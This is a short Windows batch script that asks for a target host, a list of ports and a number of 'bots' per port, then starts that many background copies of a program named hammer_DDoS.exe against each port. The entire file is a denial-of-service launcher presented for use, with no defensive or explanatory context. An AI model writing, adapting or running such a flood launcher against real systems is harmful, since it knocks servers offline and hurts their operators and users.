@echo off
set /p Host=Enter host: 
title Target %Host%
set /p Ports=Enter ports divided by space(80 443 etc): 
title Target %Host%:(%Ports%)
set /p Count=Enter count of bots per port: 
FOR /l %%x in (1, 1, %Count%) DO (
	FOR %%p in (%Ports%) DO (
	start /B %cd%/hammer_DDoS.exe -s %Host% -p %%p
	)
)
